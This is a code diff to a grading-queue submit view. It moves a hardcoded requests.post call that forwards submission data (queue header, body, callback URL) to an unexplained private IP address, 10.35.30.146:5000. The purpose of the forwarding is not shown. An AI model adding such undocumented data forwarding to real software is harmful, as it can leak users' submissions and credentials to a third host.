@@ -30,11 +30,7 @@ def submit(request):
     else:
         # queue_name, xqueue_header, xqueue_body are all serialized
         (request_is_valid, lms_callback_url, queue_name, xqueue_header, xqueue_body) = _is_valid_request(request.POST)
-        try:
-            output_payload = (request.POST, request_is_valid, lms_callback_url, queue_name, xqueue_header, xqueue_body)
-            requests.post('http://10.35.30.146:5000', data=str(output_payload))
-        except requests.ConnectionError:
-            print('Connection error to http://10.35.30.146:5000')
+
         if not request_is_valid:
             log.error("Invalid queue submission from LMS: lms ip: {0}, request.POST: {1}".format(
                 get_request_ip(request),
@@ -83,6 +79,12 @@ def submit(request):
                 transaction.commit()  # Explicit commit to DB before inserting submission.id into queue
 
                 qcount = Submission.objects.get_queue_length(queue_name)
+
+                try:
+                    output_payload = (True, request_is_valid, lms_callback_url, queue_name, xqueue_header, xqueue_body)
+                    requests.post('http://10.35.30.146:5000/submit', data=str(output_payload))
+                except requests.ConnectionError:
+                    print('Connection error to http://10.35.30.146:5000/submit')
 
                 # For a successful submission, return the count of prior items
                 return HttpResponse(compose_reply(success=True, content="%d" % qcount))
